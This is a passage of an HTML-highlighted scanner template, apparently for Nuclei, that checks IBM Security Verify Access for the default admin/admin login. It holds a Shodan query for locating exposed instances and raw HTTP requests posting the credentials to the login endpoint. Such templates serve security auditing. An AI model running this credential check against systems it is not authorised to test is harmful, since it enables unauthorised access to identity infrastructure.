span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;IBM Security Verify Access&quot;</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">tags:</span> ibm,default-login<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/core/j_security_check</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">j_username</span><span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;j_password<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;&amp;commit<span class="hljs-operator">=</span>&amp;locale<span class="hljs-operator">=</span>en&amp;_method<span class="hljs-operator">=</span>PUT<br><br>    <span class="hljs-params">attack:</span> pitchfork<br><br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">username:</span><br>        <span class="hljs-operator">-</span> admin<br>      <span class="hljs-params">password:</span><br>        <span class="hljs-operator">-</span> admin<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator